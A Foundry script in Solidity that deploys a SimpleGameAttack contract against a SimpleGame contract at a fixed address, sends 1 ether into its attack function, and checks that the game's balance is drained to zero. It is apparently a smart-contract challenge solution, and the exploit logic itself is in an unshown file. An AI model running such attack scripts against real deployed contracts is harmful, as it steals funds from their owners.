// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {Script, console} from "forge-std/Script.sol";
import {SimpleGameAttack} from "../src/SimpleGameAttack.sol";
import {SimpleGame} from "../src/SimpleGame.sol";

contract SimpleGameAttackScript is Script {
    SimpleGame public simpleGame = SimpleGame(0x94C8897Cf37906f1E66F743654Be69D5ebad2e76);
    SimpleGameAttack public simpleGameAttack;

    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        require(!simpleGame.isFinished(), "already finished");

        simpleGameAttack = new SimpleGameAttack(address(simpleGame));
        simpleGameAttack.attack{value: 1 ether}();

        // Verify the results of the attack
        require(simpleGame.isFinished(), "!finished");
        require(address(simpleGame).balance == 0, "funds left");

        vm.stopBroadcast();
    }
}
